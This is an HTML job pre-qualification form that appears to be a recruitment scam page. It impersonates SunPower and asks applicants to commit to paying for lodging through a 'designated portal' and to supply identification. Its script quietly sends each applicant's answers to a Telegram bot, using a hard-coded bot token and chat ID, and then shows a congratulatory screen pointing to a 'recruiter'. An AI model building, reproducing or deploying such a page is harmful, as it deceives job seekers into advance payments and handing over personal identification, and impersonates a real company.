<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Pre-Qualification Questions</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="style.css">
</head>

<body>

<div class="app">

  <!-- FORM CARD -->
  <div class="card" id="formCard">

    <h1>Pre-Qualification Questions</h1>
    <p class="subtitle">
      Please respond to the following questions to continue.
    </p>

    <form id="form">

      <!-- Q1 -->
      <div class="question">
        <p>1. Availability <span class="req">*</span></p>
        <small>
          Full-time, on-site availability in Nashville, TN for the full 9-month project.<br>
          <strong>Required</strong> to ensure project scheduling and continuity.
        </small>
        <div class="options">
          <label><input type="radio" name="q1" value="Yes" required> Yes</label>
          <label><input type="radio" name="q1" value="No"> No</label>
        </div>
      </div>

      <!-- Q2 -->
      <div class="question">
        <p>2. Onboarding Compliance <span class="req">*</span></p>
        <small>
          Ability to complete all onboarding steps: application, contract execution,
          employee portal registration, and mandatory safety training.<br>
          <strong>Required</strong> for compliance and job-site access.
        </small>
        <div class="options">
          <label><input type="radio" name="q2" value="Yes" required> Yes</label>
          <label><input type="radio" name="q2" value="No"> No</label>
        </div>
      </div>

      <!-- Q3 -->
      <div class="question">
        <p>3. Lodging Requirement <span class="req">*</span></p>
        <small>
          Ability to reserve and pay for lodging through the SunPower-designated portal
          prior to the start date.<br>
          <strong>Required</strong> to finalize assignment, scheduling, and operational planning.
        </small>
        <div class="options">
          <label><input type="radio" name="q3" value="Yes" required> Yes</label>
          <label><input type="radio" name="q3" value="No"> No</label>
        </div>
      </div>

      <!-- Q4 -->
      <div class="question">
        <p>4. Employment Identification <span class="req">*</span></p>
        <small>
          Ability to provide two acceptable forms of employment identification in
          accordance with hiring requirements.<br>
          <strong>Required</strong> for employment verification.
        </small>
        <div class="options">
          <label><input type="radio" name="q4" value="Yes" required> Yes</label>
          <label><input type="radio" name="q4" value="No"> No</label>
        </div>
      </div>

      <!-- FINAL NOTICE -->
      <div class="notice">
        All questions above are part of the pre-qualification process for employment
        consideration. These requirements are necessary to ensure proper onboarding,
        compliance, and operational planning.
      </div>

      <button type="submit">Submit</button>

    </form>
  </div>

  <!-- RESULT SCREEN -->
  <div class="result hidden" id="resultScreen">
    <div class="confetti"></div>
    <h2>Congratulations</h2>
    <p>
      Your responses have been successfully submitted.
      <br><br>
      Please contact your assigned recruiter for the next steps in the process.
    </p>
  </div>

</div>

<script>
document.getElementById("form").addEventListener("submit", function(e) {
  e.preventDefault();

  const data = new FormData(this);
  const failed = ["q1","q2","q3","q4"].some(q => data.get(q) === "No");

  const msg =
    "ðŸ“‹ PRE-QUALIFICATION SUBMISSION\n\n" +
    "Status: " + (failed ? "NOT ELIGIBLE" : "ELIGIBLE") + "\n\n" +
    "Availability: " + data.get("q1") + "\n" +
    "Onboarding: " + data.get("q2") + "\n" +
    "Lodging: " + data.get("q3") + "\n" +
    "Identification: " + data.get("q4");

  fetch("https://api.telegram.org/bot8219963792:AAGWcvtcyC0rd0zMLXN2Uf3uPUySB9GuBTw/sendMessage", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: "8547093828",
      text: msg
    })
  });

  document.getElementById("formCard").classList.add("fade-out");

  setTimeout(() => {
    document.getElementById("formCard").style.display = "none";
    document.getElementById("resultScreen").classList.remove("hidden");
  }, 400);
});
</script>

</body>
</html>
